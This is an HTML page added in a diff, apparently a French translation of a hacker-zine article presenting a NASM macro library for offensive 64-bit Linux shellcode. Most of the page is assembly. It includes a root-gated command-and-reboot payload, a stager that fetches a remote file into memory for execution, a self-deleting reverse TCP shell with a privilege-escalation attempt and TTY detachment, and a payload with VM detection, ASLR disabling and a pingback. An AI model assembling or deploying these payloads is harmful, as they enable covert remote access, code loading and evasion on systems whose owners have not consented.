@@ -1,0 +1,193 @@
+<html>
+<head>
+<title>Bare Metal Jacket</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+ ▀█████████▄           ▄▄▄▄███▄▄▄▄                ▄ 
+   ███ 00 ███      ▄ █ █▀▀▀███▀▀▀█ █ ▄          █ █
+   ███    ███      █ █ █fff███   █0x90          █ █ 
+  ▄███▄▄90▄██      █ █ █   ███   █ █ █          █ █ 
+ ▀▀███▀▀▀██▄         █ █   ███   █ █            █0x 
+   ███0xc0██▄      █ █ █   ███   █ █ █          █ █ 
+   ███c3  ███      █ █ █   0x0fff█ █ █     █    █ █ 
+ ▄█████|████▀        ▀ █   ███   | ▀       █▄▄▄▄█ █ 
+       |                         |             |
+       |                         |             |
+       |                         |             |
+       |      .                  |      .      |      .   .      .  .      . 
+       |    .   .                | * .         |  .  *     .   .     .
+       | .  .                    | .   *       |   *  .   *   .    .
+ ~~~~~~~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~   ~   ~   ~  ~   - - - - - - - - - - -  -   -   -   =]D&gt;
+       |   .   .                 |   *  *      |  .  *   *    .
+       |      .                  |    .        |  . *  .   *     *
+       |                         |      .      |     *  .  .   *
+       |---- [Bare]              |             |      .    
+                                 |             |
+                     [Metal] ----|             |       
+                                               |       
+          [Jacket]-----------------------------|       
+
+
+        ----{ Wintrmvte @ redcodelabs.io &lt;*&gt; }----
+
+
+
+| - - - - [ Introduction ]
+
+[ Traduction par Tednoob17 ]
+
+Lorsque j'ai commencé avec le shellcoding manuel il y a quelques années, je me suis 
+concentré sur la plateforme x86_64 32 bits en raison de la grande quantité de 
+ressources et références fantastiques en ligne (SLAE, pour n'en citer qu'une).
+
+La transition vers l'écosystème 64 bits a été assez rude, car les exemples de code et 
+les write-ups ne couvrent souvent pas les scénarios Linux modernes avec une approche 
+bas niveau ; et quand ils le font, ce sont principalement des concepts basiques qui 
+sont abordés.
+
+Cet outil n'apporte rien de nouveau, mais il pourrait servir de point de départ pour 
+votre prochain projet. Vous trouverez ici des macros Nasm standard pour l'automatisation 
+des tâches, ainsi que des macros plus complexes pour enrichir vos techniques d'assembly.
+
+
+
+| - - - - [ Example #1 = Command Execution ]
+
+Nous allons commencer par l'exemple le plus simple - l'exécution de commande arbitraire.
+Notre code doit vérifier s'il a été exécuté avec des privilèges élevés.
+Si c'est le cas, il lancera une commande shell en arrière-plan et tentera de 
+redémarrer l'hôte.
+
+------------ cmd_exec.asm -----------
+    BITS 64
+    %include "bmj.asm"
+    section .text
+    global _start
+    _start:
+        is_root                     ; Returns 1 in RAX if UID=0
+        cmp rax, 1                  ; Check above condition
+        jne xit                     ; If not rut, quit execution flow with exit(0)
+        run_bg "echo pvvned"        ; Desired command to run
+        reboot
+        xit:                        ; Program exit
+        exit 0
+--------------------------------------
+
+Compilons-le :
+
+    $ nasm -f elf64 -o cmd_exec.o cmd_exec.asm 
+    $ ld -m elf_x86_64 cmd_exec.o -o cmd_exec
+
+Essayez d'exécuter le fichier ELF créé avec et sans le préfixe 'sudo'.
+
+
+
+| - - - - [ Example #2 = Time Manipulations and Second Stage Loaders]
+
+Maintenant créons quelque chose de plus complexe. Initialement, notre payload va 
+définir son temps de vie (disons 5 minutes).
+
+Pendant cette période, il tentera de mapper un fichier distant (un exécutable, un LKM 
+etc.) vers un descripteur de fichier en mémoire.
+
+Si la connexion avec le serveur qui héberge le fichier échoue pour une raison 
+quelconque, elle est réessayée dans une boucle infinie avec 20 secondes de délai 
+entre chaque tentative connect(2).
+
+Regardons le code :
+
+------------------------------- timed_stager.asm -----------
+    BITS 64
+    %include "bmj.asm"
+    section .text
+    global _start
+    _start:
+
+        set_ttl 5, MINUTES          ; We specify operational time of the payload using a pre-defined time constant
+                                    ; After this time, current process receives SIGALRM and exits
+
+        infinite_loop file_download, 20, SECONDS 
+
+    file_download:           
+        init_sock_tcp               ; New TCP socket in RAX
+        push rax
+        pop r11                     ; Save socket's fd for later use
+        sock_connect "127.0.0.1", 4444
+                                    ; File server's details specified above
+        memfd_create                ; Create an in-memory file descriptor, and return it in RAX
+        push rax
+        pop r12
+        fd2fd                       ; Read contents from one file descriptor and write to another
+                                    ; Explicit operands are r11 (source) and r12 (destination), but any registers can be used
+        ret                         ; Remember to end the 'file_download:' label flow with a 'ret' instruction
+        . . .                       ; Now we can execute our file via 'fd_exec r12' macro, or do anything else we want with it (like mmap())
+-------------------------------------------------------------
+
+Notez que nous n'avons pas à spécifier l'adresse IP du serveur en hexadécimal, car la 
+macro 'sock_connect' a un convertisseur IP -&gt; hex intégré.
+
+
+
+| - - - - [ Example #3 = Not Just a Reverse Shell]
+
+Le troisième exemple consistera en un simple reverse TCP shell.
+
+L'exécutable est supprimé du système de fichiers si certaines conditions sont remplies, 
+et la priorité du processus est augmentée (comme on le voit dans 'htop').
+
+Le payload tente également d'élever les privilèges (et échoue souvent misérablement), 
+et se détache du TTY par la suite.
+
+Un comportement démon complet (étendant setsid(0x00)) peut être trouvé dans le source 
+de la macro 'daemon_init', définie dans la section 0x05.
+
+------------------------------- reverse_shell.asm -----------
+    BITS 64
+    %include "bmj.asm"
+    section .text
+    global _start
+    _start: 
+        remove_self                 ; The binary removes itself if it's size is circa current payload size ('fsize' variable)
+        set_priority MAX_PRIO       ; We set process priority to maximum
+        elevate_full                ; Privilege escalation attempt via SETGID(0) ats SETUID(0)
+        tty_detach                  ; setsid(0x00) == detach from controlling TTY device
+        revshell "127.0.0.1", 5555  ; Spawn a standard TCP reverse shell
+        get_current_size_var        ; Initiate the 'fsize' variable used by 'remove_self' macro
+-------------------------------------------------------------
+
+
+
+| - - - - [ Example #4 = Size Padding and VM Detection]
+
+Dans la dernière partie, utilisons deux macros de padding pour insérer un court NOP 
+sled et étendre la taille du payload jusqu'à 256 octets au total.
+
+Il effectuera également un pingback sec d'un hôte externe pour garantir que l'exécution 
+du payload a réussi.
+
+Spécifions également une méthode de détection de virtualisation unique en haut, et un 
+verrou de fichier pour prévenir un comportement zombie éventuel de notre code sur un 
+seul hôte.
+
+------------------------------- vm_and_stuff.asm -----------
+    BITS 64
+    %include "bmj.asm"
+    section .text
+    global _start
+    _start:
+        nops 40
+        flock                          ; Enforce only a single process instance of the payload running concurrently
+        vm_age                         ; Check if the sample was launched inside VM by inspecting /etc/hostname STATX structure
+        disable_aslr                   ; Disable ASLR for further use
+        sock_connect "127.0.0.1", 6666 ; Address for reverse TCP pingpack
+        padd_byte 256, 0x90            ; Padds the payload size with '0x90' to reach exactly 256 bytes in total after being composed by Nasm
+-------------------------------------------------------------
+
+
+Thanks for reading, and see you in vol. III ! o/
+
+[0] <a href="https://github.com/redcode-labs/BMJ">https://github.com/redcode-labs/BMJ</a>
+</pre></body></html>
